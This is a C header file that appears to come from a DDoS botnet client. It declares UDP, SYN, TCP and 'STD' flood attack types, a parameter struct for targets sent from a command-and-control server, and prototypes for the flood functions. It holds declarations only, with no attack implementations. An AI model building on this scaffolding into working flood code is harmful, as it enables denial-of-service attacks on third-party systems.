#pragma once

#include <stdint.h>

typedef enum 
{
    ATTACK_UDP = 0x01,
    ATTACK_STD = 0x02,
    ATTACK_TCP = 0x03,
    ATTACK_SYN = 0x04,
} AttackMethod ;

typedef struct 
{
    AttackMethod method;
    uint32_t address; // 4 bytes already htonl when sent from cnc
    uint16_t dport;// 2 bytes already htons when sent from cnc
    uint32_t duration;
} AttackParams;

typedef void *(*AttackFunc)(AttackParams *);

struct attack_method_t
{
    AttackMethod method;
    AttackFunc callPTR;
};

void attack_init(void);//make sure you call this after the first fork()
void ddos_start_attack(AttackParams *params);
void *udp_flood(AttackParams *params);
void *syn_flood(AttackParams *params);
void *tcp_flood(AttackParams *params);
void *std_flood(AttackParams *params);
